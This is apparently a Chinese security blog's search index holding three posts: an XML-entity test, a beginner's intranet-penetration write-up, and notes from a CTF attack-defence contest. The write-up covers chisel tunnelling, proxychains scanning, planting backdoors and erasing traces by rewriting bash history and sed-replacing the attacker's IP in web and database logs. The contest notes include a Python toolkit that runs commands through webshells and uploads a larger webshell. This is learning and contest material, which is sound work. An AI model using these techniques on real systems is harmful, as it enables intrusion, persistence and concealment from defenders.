<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>xss测试</title>
      <link href="/2021/12/12/xss%E6%B5%8B%E8%AF%95/"/>
      <url>/2021/12/12/xss%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><?xml version="1.0"?><!DOCTYPE message [<!ELEMENT message (#PCDATA)><!ENTITY aaa "135601360123502401401250">]<h1>&aaa;</h1><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>菜鸟随笔-内网渗透</title>
      <link href="/2021/11/25/%E8%8F%9C%E9%B8%9F%E9%9A%8F%E7%AC%94-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
      <url>/2021/11/25/%E8%8F%9C%E9%B8%9F%E9%9A%8F%E7%AC%94-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p>某菜鸟最近开始遇到涉及内网的题目，加上十分想出一道和内网有关的题，开始了对内网的学习之旅</p><p>我还是挺喜欢写菜鸟随笔的，可以完全放飞自我，然后写一点自己理解的叶不知道对还是错的东西</p><p>注：通篇都是某菜鸟自己的理解，如有错漏，那就去看看原文吧</p><h2 id="内网的概念"><a href="#内网的概念" class="headerlink" title="内网的概念"></a>内网的概念</h2><p>内网，从一般概念来说，是指在一个局域网内建立的网络或办公网络，外网无法直接访问内网…..</p><p>好吧这都是废话，想了解的去参考地址<code>www.baidu.com</code></p><p>CTF中一个很常用的概念，就是读取/etc/hosts来确定内网的存活主机，我也就从这里开始</p><p>首先明确几个概念</p><p>其一：内网的主机是没有真正意义的ip（内网的ip地址都是基于ARP协议对MAC地址的映射）的，内网的访问本质是MAC地址的访问，这个涉及ARP，不想多说</p><p>其二：学习反向代理时可以得到一个知识点，我们通过域名访问的服务器并不是真正的数据服务器，而是真正服务器的反代服务器，对于我们来说，真正的数据服务器就位于该网站的内网</p><p>其三：windows和Linux默认规则访问域名时首先查询hosts本机的hosts文件，Linux下的hosts文件有以下定义</p><ul><li>作为DNS服务器，进行域名解析</li><li>两台主机只是双机互连时，这时两台主机都需要设置自己的ip，同时在对方的hosts文件里加入自己的ip和主机名。</li><li>加快远程登录linux主机速度</li></ul><p>只是觉得双向主机很怪，为什么hosts可以记录存活主机，不懂</p><blockquote><p>于是我问了下</p><p>总结一下就是，hosts并不能记录存活主机，它在CTF的作用是比赛时涉及内网了给个提示</p><p>在渗透测试中，建立内网通道后扫描到了子域名时，也可以在本机配置hosts用来访问内网中该子域名的资产</p></blockquote><p><strong>查看正在使用的服务器存活主机正确的做法是getshell后执行ifconfig命令</strong></p><p><strong>或者建立内网通道扫描存活主机</strong></p><p><img src="image-20211125213738545.png" alt="image-20211125213738545"></p><p>可以看到docker启动后多了一个ipv6的地址，这个地址相对于其他服务器，就属于内网了</p><p>使用docker inspect  8b2753a5f15e | grep “IP” 查看</p><p><img src="image-20211129183321910.png" alt="image-20211129183321910"></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p><strong>从废话回归主题，这次我用了整整一天搞懂了内网渗透的过程并成功搞定了我自己的电脑，虽然有些地方我觉得自己挺憨的，但还是很开心，我希望我可以将这部分说明白</strong></p><p>首先关于内网渗透方面在狼组安全文档中有很详细的说明</p><p>参考链接：<code>https://wiki.wgpsec.org/knowledge/hw/border-info.html</code></p><p>简单来说，无论多么复杂的攻击，都可以分为四步</p><h3 id="1、打穿外网"><a href="#1、打穿外网" class="headerlink" title="1、打穿外网"></a>1、打穿外网</h3><p>第一步，打出一个通向内网的入口，狼组文档中称为互联网边界打点</p><p>这一步可以分为两个点：信息收集和获取webshell</p><p>信息收集即收集被攻击方的资产信息，这里抄个图</p><p><img src="infoscan.png" alt="img"></p><p>详细的去看狼组文档，我这里也说不清楚</p><p>这里的目的实际上就是找到防护弱的点，通过进攻弱点得到webshell</p><p>这里并不局限于通过漏洞进攻，社工同样可行，只要拿到内网的一台主机并可以上传文件就算是成功</p><h3 id="2、构建内网通道"><a href="#2、构建内网通道" class="headerlink" title="2、构建内网通道"></a>2、构建内网通道</h3><p>通过外网事无法访问内网资源的，同样只是拿到webshell是无法攻击内网其他主机的，为了扩大成果或者不得不扩大成果，就需要继续进攻内网，这就是所谓的内网渗透</p><p>在对内网渗透时，首先要做的就是构建一条攻击机通往内网主机的通道，让攻击机可以去访问内网的资源，这也是我这次谈的重点，算是内网渗透的入门</p><p>这里需要借助代理工具，我使用的是chisel，参考链接有详细使用说明</p><p>参考链接：<code>https://cloud.tencent.com/developer/article/1781919</code></p><p>这个工具的优点是体量小，只要上传一个文件就可以直接用，而且不会让一般的杀软报毒</p><h4 id="chisel正向代理"><a href="#chisel正向代理" class="headerlink" title="chisel正向代理"></a>chisel正向代理</h4><p>chisel有两个模式，分别是server 和 client ,server为代理服务器使用，client为客户机使用，不过这说的是正常的使用模式</p><p>了解代理的师傅应该都知道正反的区别，正代指我们访问一个不可达的网站时，通过访问可达的一个“中介”，让“中介”去访问，然后将结果给我们</p><h4 id="chisel正代的使用"><a href="#chisel正代的使用" class="headerlink" title="chisel正代的使用"></a>chisel正代的使用</h4><p>简单说说chisel怎么用，这里以云服务器为受害机，我的主机为攻击机</p><p>chisel正代用于反代通道构建并成功探测到内网资源之后访问用，这里做个简单的演示</p><p>假设我现在已经对服务器getshell，可以上传文件，并且已经得知有个内网地址为172.17.0.13，那么我将chisel上传上去，然后执行</p><pre class="line-numbers language-chisel"><code class="language-chisel">./chisel server -p 1234<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211126202708678.png" alt="image-20211126202708678"></p><p>然后主机执行</p><pre class="line-numbers language-chisel"><code class="language-chisel">chisel client -v xxx.xxx.xxx.xxx:1234 3000:172.17.0.13:80// 连接受害服务器1234端口，并将其内网172.17.0.13的80端口映射到攻击主机的3000端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="image-20211126203118753.png" alt="image-20211126203118753"></p><p>接着本地访问<code>localhost:3000</code>,就可以访问到内网资源</p><p><img src="image-20211126203228606.png" alt="image-20211126203228606"></p><p><strong>接下来就可以对该内网网站进行渗透攻击</strong></p><p><strong>将服务器中内网docker容器映射到攻击机3000端口</strong></p><p><img src="image-20211129184039742.png" alt="image-20211129184039742"></p><p><img src="image-20211129184055991.png" alt="image-20211129184055991"></p><p><img src="image-20211129184106809.png" alt="image-20211129184106809"></p><p>正代成功，可以对内网网站进行攻击了</p><h4 id="chisel反向代理"><a href="#chisel反向代理" class="headerlink" title="chisel反向代理"></a>chisel反向代理</h4><p>反代是指将自已的信息给中介，有人来找我们直接通过中介就行，中介得到我们的回复后再传话给委托人</p><p>内网通道的建立就是用了反代的思想，让攻击机作为中介方兼任委托人，达成访问内网资源的目的</p><p>刚说了正代可以将受害主机内网地址映射到攻击主机端口，反代就可以建立攻击机到受害内网的通道，在此基础上进行一系列的攻击</p><h4 id="chisel反代的使用"><a href="#chisel反代的使用" class="headerlink" title="chisel反代的使用"></a>chisel反代的使用</h4><p>这里以公网云服务器为攻击机，自己的主机为受害机</p><p>受害主机执行</p><pre class="line-numbers language-chisel"><code class="language-chisel">chisel client xxx.xxx.xxx.xxx:1080 R:socks<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211126211614707.png" alt="image-20211126211614707"></p><p>R参数意为反向Socket</p><p>攻击服务器执行</p><pre class="line-numbers language-chisel"><code class="language-chisel">./chisel server -p 1234 --reverse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211126211757460.png" alt="image-20211126211757460"></p><p>出现红框文字即为反代成功、</p><p><strong>正向即服务器来接收客户端数据，反向指由客户端接收服务器数据，反向时服务器加–reverse，客户端加R</strong></p><h4 id="proxychains4执行代理"><a href="#proxychains4执行代理" class="headerlink" title="proxychains4执行代理"></a>proxychains4执行代理</h4><p>成功后即可使用proxychains4去执行</p><p>正常不使用代理执行：</p><p><img src="image-20211126220105140.png" alt="image-20211126220105140"></p><p>使用代理执行：</p><p><img src="image-20211126220228215.png" alt="image-20211126220228215"></p><p>可以明确的看到使用代理执行后ip地址变成了被攻击机ip，即内网通道构建成功</p><h4 id="proxychains的安装配置"><a href="#proxychains的安装配置" class="headerlink" title="proxychains的安装配置"></a>proxychains的安装配置</h4><p>这里一并把踩得坑都说了</p><pre class="line-numbers language-bash"><code class="language-bash">// 安装apt <span class="token function">install</span> proxychains4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>proxychains命令需要配置两个点，都在/etc/proxychains.conf文件中</p><p><strong>首先是最后，需要注释socks4 然后添加socks5 ，配置如下，这使得proxychains可以正常发送请求到被攻击主机</strong></p><p><img src="image-20211126222927397.png" alt="image-20211126222927397"></p><p><strong>然后是中间位置需要注释代理的DNS解析</strong></p><p><img src="image-20211126223218164.png" alt="image-20211126223218164"></p><p><strong>这确保了可以正常使用nmap等工具对内网进行扫描</strong></p><h4 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h4><p>这里我特意抓了一下流量看了看，算是了解一下怎么辨别这种攻击</p><h5 id="首先是反代流量"><a href="#首先是反代流量" class="headerlink" title="首先是反代流量"></a>首先是反代流量</h5><p><img src="image-20211126221005037.png" alt="image-20211126221005037"></p><p>可以很明显的看到，反代在攻击的前后，有一个很明显的代理访问请求</p><p>攻击前传输命令，攻击后将命令发送回服务器，所以通过这种方式去观察流量包，可以获取对方的真实ip/代理ip地址</p><p>所以参考文章说无法获取攻击者ip不成立，这个代理现象很明显，最妥当的方法是想办法给攻击服务器上一层代理</p><p>不过这个我还不会。当然chisel提供了解决方案</p><p> –backend,此选项用于指定被攻击方何事收到http请求</p><h5 id="然后是正代流量"><a href="#然后是正代流量" class="headerlink" title="然后是正代流量"></a>然后是正代流量</h5><p>开启正代，抓取服务器流量</p><p><img src="image-20211128205634540.png" alt="image-20211128205634540"></p><p>只能看到攻击机公网ip和目标内网的交互，无法做到准确的辨别，也没有队80端口的访问记录，所以只要将端口选取的不那么突兀，就不会被轻易发现</p><h3 id="3、proxychains-命令使用代理扫描内网"><a href="#3、proxychains-命令使用代理扫描内网" class="headerlink" title="3、proxychains 命令使用代理扫描内网"></a>3、proxychains 命令使用代理扫描内网</h3><p>这里只以nmap做演示</p><pre class="line-numbers language-bash"><code class="language-bash">proxychains nmap -sT -Pn -T4 172.17.125.0/24 -oG res.txt 命令随意<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>内网通道构建成功，想用什么扫用什么扫，不局限nmap，只由一点需要注意，chisel是基于TCP建立的链接，所以需要使用nmap的-sT选项，并且禁用ping</p><p><img src="image-20211129085707226.png" alt="image-20211129085707226"></p><p>扫描到内网的ip和端口后，就可以构建正代通道或使用其他方法对内网服务器进行攻击，挨个的控制内网服务器，构建正代的优点就是可以像打公网服务器一样去打内网</p><p>然后一个个的<strong>留下后门维持权限</strong>，以备后用</p><p>这里再说一个命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">screen</span> 将执行的程序放到新窗口运行常用：<span class="token function">screen</span> -S name 开启一个名为name的新窗口<span class="token function">screen</span> -r name/session_id 连接/进入开启的一个窗口<span class="token function">screen</span> -ls 显示所有窗口<span class="token function">screen</span> -d  name/session_id 关闭指定窗口<span class="token function">screen</span> -X -S session_id quit 杀死指定窗口进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>通过执行-ls 可以判断自己是处于那个窗口</strong></p><p><img src="image-20211129092645976.png" alt="image-20211129092645976"></p><p>如图后面为Attached，说明我们现在处于123窗口中</p><p>扫描的过程是非常慢的，使用这个命令可以让我们不用始终盯着xshell，可以去做其他事</p><h3 id="4、清理日志，悄悄离开"><a href="#4、清理日志，悄悄离开" class="headerlink" title="4、清理日志，悄悄离开"></a>4、清理日志，悄悄离开</h3><p>需要清理的日志一共有三种。bash、系统、应用</p><h4 id="bash命令日志"><a href="#bash命令日志" class="headerlink" title="bash命令日志"></a>bash命令日志</h4><p>bash命令日志就是history命令记录的操作信息</p><p>history的所有结果都是保存在root目录下.bash_history这个文件中，所以只要删除这个文件，就可以清除全部的命令</p><p><img src="image-20211129093553857.png" alt="image-20211129093553857"></p><p>当然，如图所示，会留下删除的命令，而且直接清空其实并不隐蔽，很容易被发现，所以需要先关闭history的记录，然后配合sed命令进行修改</p><p>先看看HISTSIZE的值，以备后续恢复</p><p><img src="image-20211129094214547.png" alt="image-20211129094214547"></p><p>然后执行</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> HISTSIZE<span class="token operator">=</span>0或者<span class="token function">export</span> HISTSIZE<span class="token operator">=</span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="image-20211129095449175.png" alt="image-20211129095449175"></p><p>如图，history没有记录ls</p><p>此时对.bash_history进行操作，就不会留下痕迹</p><p>这里建议使用sed命令</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> <span class="token string">"s/rm .bash_history/ls/g"</span> -i .bash_history 将rm .bash_history 改为ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211129095608811.png" alt="image-20211129095608811"></p><p><img src="image-20211129095714857.png" alt="image-20211129095714857"></p><p>改完所有痕迹后将HISTSIZE还原回去，当然这里其实没有必要，通过export执行的修改只是临时的修改，仅仅作用在当前的窗口，不影响整体的环境值</p><p>所以直接关闭这窗口就行</p><p><img src="image-20211129100029631.png" alt="image-20211129100029631"></p><p>这样history日志就没有留下任何的痕迹</p><h4 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h4><table><thead><tr><th align="left">日志文件</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><code>/var/log/btmp</code></td><td align="left">记录**错误登录（登陆失败）**日志；使用**lastb**命令查看</td></tr><tr><td align="left"><code>/var/log/lastlog</code></td><td align="left">记录系统中所有用户最后一次成功登录时间，使用<strong>lastlog</strong>命令查看</td></tr><tr><td align="left"><code>/var/log/wtmp</code></td><td align="left">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件；用<strong>last</strong>命令来查看</td></tr><tr><td align="left"><code>/var/log/utmp</code></td><td align="left">只记录<strong>当前登录用户</strong>的信息；使用<strong>w,who,users</strong>等命令来查询</td></tr><tr><td align="left"><code>/var/log/secure</code></td><td align="left">记录验证和授权方面的信息，如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码（Centos）</td></tr></tbody></table><p>Linux系统自带五个系统日志分别对不同情况进行记录，保存的功能如上，通过同修改history的手法全部修改即可</p><h4 id="应用日志"><a href="#应用日志" class="headerlink" title="应用日志"></a>应用日志</h4><p>即WEB日志，包括apache2，mysql，nginx等服务器上可能会记录我们操作的所有程序，较为繁杂</p><p>这里直接贴狼组文档的描述</p><p><strong>apache日志</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> ‘s/192.168.1.3/8.8.8.8/g’ –i /var/log/apache/access.log<span class="token function">sed</span> ‘s/192.168.1.3/8.8.8.8/g’ –i /var/log/apache/error_log<span class="token comment" spellcheck="true">#其中192.168.1.3是我们的IP，8.8.8.8是我们伪造的IP</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>MySQL日志文件</strong></p><pre class="line-numbers language-bash"><code class="language-bash">log-error<span class="token operator">=</span>/var/log/mysql/mysql_error.log        <span class="token comment" spellcheck="true">#错误日志</span>log-slow-queries<span class="token operator">=</span>/var/log/mysql/mysql_slow.log    <span class="token comment" spellcheck="true">#慢查询日志</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> <span class="token string">'s/192.168.1.3/8.8.8.8/g'</span> –i /var/log/mysql/mysql_error.log<span class="token function">sed</span> <span class="token string">'s/192.168.1.3/8.8.8.8/g'</span> –i /var/log/mysql/mysql_slow.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>php日志处理</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> <span class="token string">'s/192.168.1.3/192.168.1.4/g'</span> –i /var/log/apache/php_error.log <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>windows日志的处理参考<code>https://wiki.wgpsec.org/knowledge/hw/log-action.html#windows%E6%97%A5%E5%BF%97%E5%A4%84%E7%90%86</code></p><p>我不懂windows方面，所以这里不谈windows</p><p>最后总结一下内网渗透的四个步骤</p><blockquote><p>1、通过公网打进内网</p><p>2、建立通道持续攻击</p><p>3、留下后门维持权限</p><p>4、清除痕迹安然离开</p></blockquote><p>+++</p><p>至此，一个完整的内网渗透就完成了，不过具体操作具体执行，先不说打进去能不能控制内网服务器，单提能不能打进去，我觉得够呛</p><p>+++</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记2021年终内部赛</title>
      <link href="/2021/11/22/%E8%AE%B02021%E5%B9%B4%E7%BB%88%E5%86%85%E9%83%A8%E8%B5%9B/"/>
      <url>/2021/11/22/%E8%AE%B02021%E5%B9%B4%E7%BB%88%E5%86%85%E9%83%A8%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="awd"><a href="#awd" class="headerlink" title="awd"></a>awd</h2><h3 id="攻击函数集合"><a href="#攻击函数集合" class="headerlink" title="攻击函数集合"></a>攻击函数集合</h3><p>这里我比赛前就写好了，不过他出了些问题，裂开，正好乘机修一下</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># TODO 调用第三方库</span><span class="token keyword">import</span> base64<span class="token keyword">import</span> os<span class="token keyword">import</span> re<span class="token keyword">import</span> random<span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token comment" spellcheck="true"># TODO 提交flag函数, 需要抓包查看提交的地址，稳妥 调用： submit_flag(flag, url)</span><span class="token comment" spellcheck="true"># 需要修改 submit_url data header 位置</span><span class="token keyword">def</span> <span class="token function">submit_flag</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        submit_url <span class="token operator">=</span> <span class="token string">"http://172.17.135.26:19999/api/flag"</span>    <span class="token comment" spellcheck="true"># 这里写抓包得到的提交地址,最前面不需要加 /</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true"># flag</span>            <span class="token string">"flag"</span><span class="token punctuation">:</span> <span class="token string">"{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        header <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true"># token</span>            <span class="token string">"Authorization"</span><span class="token punctuation">:</span> <span class="token string">"320ca217aab29b1a789e5f5e81bc9ec3"</span>        <span class="token punctuation">}</span>        proxy <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">#"http": "http://localhost:8080"  # 使用代理，方便抓包，可以不用</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">#######  以下无需修改</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>submit_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> json<span class="token operator">=</span>data<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxy<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">print</span><span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"[+]"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"[-]flag提交函数未知错误"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># TODO 提交flag函数 调用 curl_submit_flag(flag, url) 只能在Linux中使用，需要用wsl跑Windows需要考虑转义问题 暂不使用</span><span class="token comment" spellcheck="true"># 此函数需修改 submit_format ,并且只限于赛方给了curl传flag的情况下</span><span class="token comment" spellcheck="true"># 传入flag和题目靶机首地址，例如 http://172.17.135.26:10016/</span><span class="token comment" spellcheck="true"># def curl_submit_flag(flag, url):</span><span class="token comment" spellcheck="true">#     try:</span><span class="token comment" spellcheck="true">#         # 这里写给出的提交flag格式</span><span class="token comment" spellcheck="true">#         submit_format = 'curl -X POST http://172.17.135.26:19999/api/flag -H "Authorization: 320ca217aab29b1a789e5f5e81bc9ec3" -d "{ \"flag\": \"' + flag + '\" }"'</span><span class="token comment" spellcheck="true">#         print(url)</span><span class="token comment" spellcheck="true">#         os.system(submit_format)</span><span class="token comment" spellcheck="true">#     except:</span><span class="token comment" spellcheck="true">#         print(url + " :flag提交未知错误")</span><span class="token comment" spellcheck="true">#         pass</span><span class="token comment" spellcheck="true"># TODO 脏数据,用于恶心日志文件 调用：dirty_data(url)</span><span class="token comment" spellcheck="true"># 该函数已封装完毕，无需任何修改</span><span class="token comment" spellcheck="true"># 传入flag和题目靶机首地址，例如 http://172.17.135.26:10016/</span><span class="token keyword">def</span> <span class="token function">dirty_data</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"cmd"</span><span class="token punctuation">:</span> <span class="token string">"system('cat /flag');"</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">#  单纯脏日志注释for，并在主函数加上while</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            s0 <span class="token operator">=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            s1 <span class="token operator">=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            s2 <span class="token operator">=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            s3 <span class="token operator">=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            s4 <span class="token operator">=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 生成脏链接</span>            url_dirty <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"?"</span> <span class="token operator">+</span> s0 <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> s1 <span class="token operator">+</span> s2 <span class="token operator">+</span> s3 <span class="token operator">+</span> s4            <span class="token comment" spellcheck="true"># print(url_dirty)</span>            requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_dirty<span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">"条脏数据上传失败"</span><span class="token punctuation">)</span>        <span class="token keyword">pass</span><span class="token comment" spellcheck="true"># TODO 获取flag ,漏洞利用函数 调用： flag = attack(url)</span><span class="token comment" spellcheck="true"># 此函数运行需要修改 payload_address data/posix并设置get/post传参</span><span class="token comment" spellcheck="true"># flages = str(flag_text)[2:-2] 处可以对flag做出调整</span><span class="token comment" spellcheck="true"># 此函数可以基于传参进行任意攻击,不局限于提交flag</span><span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 木马文件路径,例如： include/shell.php 最开始不加 /</span>        payload_address <span class="token operator">=</span> <span class="token string">"App/Mobile/Controller/wtf.php"</span>        <span class="token comment" spellcheck="true"># post</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"file"</span><span class="token punctuation">:</span> <span class="token string">"cat /flag ||"</span>  <span class="token comment" spellcheck="true"># 攻击执行</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true"># get</span>        params <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">""</span><span class="token punctuation">:</span> <span class="token string">""</span>  <span class="token comment" spellcheck="true"># get传参</span>        <span class="token punctuation">}</span>        url_shell <span class="token operator">=</span> url <span class="token operator">+</span> payload_address        shell_res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_shell<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>text  <span class="token comment" spellcheck="true"># 这是post请求</span>        <span class="token comment" spellcheck="true"># shell_res = requests.get(url_shell, params=params).text  # 这是get请求</span>        flag_text <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'flag{.*?}'</span><span class="token punctuation">,</span> shell_res<span class="token punctuation">)</span>        flages <span class="token operator">=</span> str<span class="token punctuation">(</span>flag_text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"[攻击完毕[+]]"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flages<span class="token punctuation">)</span>        <span class="token keyword">return</span> flages    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag获取失败"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span>        <span class="token keyword">pass</span><span class="token comment" spellcheck="true"># 利用小马上传大马</span><span class="token keyword">def</span> <span class="token function">upload_malaysia</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 木马文件路径,例如： include/shell.php 最开始不加 /</span>        payload_address <span class="token operator">=</span> <span class="token string">"include/shell.php"</span>        url_shell <span class="token operator">=</span> url <span class="token operator">+</span> payload_address        <span class="token comment" spellcheck="true"># print(url_shell)</span>        <span class="token comment" spellcheck="true"># 获取文件</span>        <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"nodie.php"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            file <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">## post</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true"># "passwd": "atmujie",  # 密码验证</span>            <span class="token string">"cmd"</span><span class="token punctuation">:</span> <span class="token string">"file_put_contents('/var/www/html/apache.php',base64_decode(\"{}\"));"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 攻击执行</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true"># print(data)</span>        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_shell<span class="token punctuation">,</span> data<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">## get</span>        <span class="token comment" spellcheck="true"># requests.get(url_shell+"?s=payload")</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]"</span> <span class="token operator">+</span> url <span class="token operator">+</span> <span class="token string">"尝试上传大马完毕，自行测试是否成功"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"大马上传失败"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span>        <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token 